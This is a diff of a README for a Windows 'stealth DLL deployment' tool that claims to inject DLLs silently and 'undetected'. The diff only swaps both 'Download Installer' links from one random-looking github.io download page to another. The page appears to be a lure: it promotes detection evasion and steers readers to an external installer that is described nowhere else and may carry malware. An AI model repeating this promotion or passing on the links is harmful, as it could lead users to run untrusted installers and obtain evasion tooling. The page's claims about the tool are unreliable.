@@ -2,7 +2,7 @@
 
 Welcome to the Undetected Injectors 2026 Advanced Suite, the ultimate Windows desktop tool for stealth DLL deployment. This suite offers advanced features for loading and mapping DLLs silently, making it ideal for developers and enthusiasts. Built with the latest technology for 2026, it ensures undetected operation on Windows 10 and 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ For any queries, you can reach out through our GitHub issues page. We strive to 
 
 For the latest version, please use the following link:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Additional Notes
 
